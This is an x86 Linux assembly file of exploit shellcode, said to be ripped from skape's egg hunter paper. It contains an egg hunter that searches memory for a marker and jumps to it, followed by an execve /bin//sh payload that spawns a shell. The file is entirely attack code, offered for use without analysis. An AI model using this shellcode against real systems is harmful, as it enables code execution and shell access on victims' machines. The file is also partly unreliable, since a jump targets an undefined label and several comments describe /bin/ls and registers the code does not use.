;Egg hunter code Ripped from http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
;
;
global _start
section .text
_start:

begin:
	or cx,0xfff		;retrieve last address in page
addlbl:
	inc ecx			;increase ecx
	push byte +0x43		;sigaction syscall number
	pop eax			;load sigaction syscall into eax
	int 0x80		;make the call
	cmp al,0xf2		;check for access violation
	jz start 		;return to start of 0xfff
	mov eax,0x50905090	;Egg being loaded into eax
	mov edi,ecx		;load pointer into edi register
	scasd			;compare values in eax and with those in edi
	jnz addlbl		;check whether egg  has been found
	scasd			;continue if egg has been found
	jnz addlbl		;return to increase edx only if the first egg has been found
	jmp edi			;start of shellcode

;Marker to be searched. Must be placed at the start of the shellcode
    nop                     ; 0x90
    push eax                ; 0x50
    nop
    push eax
    nop
    push eax
    nop
    push eax
; Place any shellcode here
	xor eax, eax    	;zero out eax register
	cdq
	push eax
	push 0x68732f2f 	;push /bin//sh onto the stack
	push 0x6e69622f
	mov ebx, esp    	;because ebx points to the //bin/ls
	push eax        	; push 32bit null terminator to the stack
	mov edx, esp    	; empty array for envp
	push ebx        	; address of where //bin/ls is
	mov ecx, esp    	; this is the argv array with string ptr
	mov al, 11      	;syscall for execve
	int 0x80

